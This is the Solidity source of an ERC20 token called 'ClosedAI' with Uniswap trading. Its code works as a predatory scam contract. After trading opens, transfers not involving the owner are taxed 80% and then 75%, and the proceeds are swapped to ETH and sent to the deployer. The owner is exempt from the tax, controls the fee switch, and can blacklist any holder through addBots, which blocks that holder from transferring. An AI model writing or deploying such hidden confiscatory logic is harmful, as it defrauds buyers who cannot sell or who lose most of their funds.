// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract ClosedAI is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;

    address payable private _taxWallet;

    uint256 private _initialBuyTax = 80;
    uint256 private _initialSellTax = 80;

    uint256 private _finalBuyTax = 75;
    uint256 private _finalSellTax = 75;

    uint256 private _reduceBuyTaxAt = 5;
    uint256 private _reduceSellTaxAt = 5;

    uint256 private _buyCount = 0;

    uint256 private _preventSwapBefore = 20;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;

    string private constant _name = unicode"ClosedAI";
    string private constant _symbol = unicode"CLOSEDAI";

    // max 2% supply
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    // max 2% supply
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;

    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;

    bool private feeSwitch;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        _taxWallet = payable(msg.sender);
        _balances[msg.sender] = _tTotal;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        feeSwitch = false;

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 allowed = _allowances[sender][msg.sender] - amount;
        _approve(sender, msg.sender, allowed);

        _transfer(sender, recipient, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount = 0;

        if (feeSwitch && from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            taxAmount = amount * ((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax) / (100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount * ((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax) / (100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold
                    && _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)] + taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + (amount - taxAmount);
        emit Transfer(from, to, amount - taxAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function excludeFromFee(address toExclude) external onlyOwner {
        _isExcludedFromFee[toExclude] = true;
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint256 i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);
        swapEnabled = true;
        tradingOpen = true;
        feeSwitch = true;
    }

    function reduceFee(uint256 _newFee) external onlyOwner {
        require(_newFee <= _finalBuyTax && _newFee <= _finalSellTax);
        _finalBuyTax = _newFee;
        _finalSellTax = _newFee;
    }

    function toggleFeeSwitch(bool _newFeeSwitch) external onlyOwner {
        feeSwitch = _newFeeSwitch;
    }

    function toggleSwapEnabled(bool _newSwapEnabled) external onlyOwner {
        swapEnabled = _newSwapEnabled;
    }

    receive() external payable {}
}
